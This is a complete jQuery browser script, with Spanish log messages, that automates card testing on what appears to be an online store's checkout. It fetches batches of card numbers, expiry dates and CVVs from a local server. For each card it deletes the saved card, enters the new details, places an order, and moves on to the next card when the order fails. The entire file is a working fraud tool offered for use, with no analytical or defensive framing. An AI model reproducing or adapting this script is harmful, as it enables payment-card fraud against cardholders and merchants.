var baseUrl = "localhost";
var url = "http://" + baseUrl + ":5000/post";
var iteration = null;
var request = {
     url: url,
     dataType: "jsonp"
}
var cards = function(arr) {
	var i = 0;
	var percentage = 30;
	var len = Math.ceil(arr.length * (percentage / 100));

	iteration = function() {
		if( i < len ) {
			var json = arr[i++];
			sessionStorage.card = JSON.stringify(json);

			console.log(json);

			$("#COAC3PayCCDeleteLnk0").click();

			var interval = setInterval(function(){
				console.log("Esperando el boton de delete");
				if( !$(".delete-confirmation-box").hasClass("hide-content") ) {
					clearInterval(interval);
					$("#COAC3PayCCConfirmDelBtn0").click();

					var interval2 = setInterval(function(){
						console.log("Esperando la confirmacion de delete");
						if( $("#COAC3PayCardNumber").length ) {
							clearInterval(interval2);

							$(".payment-option").addClass("payment-inactive")

							$("#COAC3PayCardNumber").val( json.card );

							if( json.card[0] == 4 )
								$(".visa").removeClass("payment-inactive")
							else
								$(".mastercard").removeClass("payment-inactive")


							$($("div[data-name=expiryMonth] button")[ Number(json.mon) ]).click();

							$($("div[data-name=expiryYear] button")[ Number(json.year) - 15 ]).click();

							$("#COAC3PayCardSecCode").val( json.cvv );

							$("#COAC3PayReviewOrderBtn").click();

							var interval3 = setInterval(function(){
								console.log("Esperando el boton de place order");
								if( !$(".accordion-module.checkout-accordion-module").hasClass("edit-mode") ) {
									clearInterval(interval3);

									$("#COPlaceOrderBtn").click();

									var interval4 = setInterval(function() {
										console.log("Esperando que se trate de hacer la orden");
										if( $("#COAC3PayCCDeleteLnk0").length ) {
											clearInterval(interval4);
											console.log("No paso, probemos otra");
											setTimeout(iteration, 2000);
										}

									}, 5000);
								}
							}, 5000);
						}
					}, 5000);

				}
			}, 5000);

		}
		else {
			$.ajax(request)
			.success(cards);;
		}

	}

	iteration();
};
$.ajax(request)
.success(cards);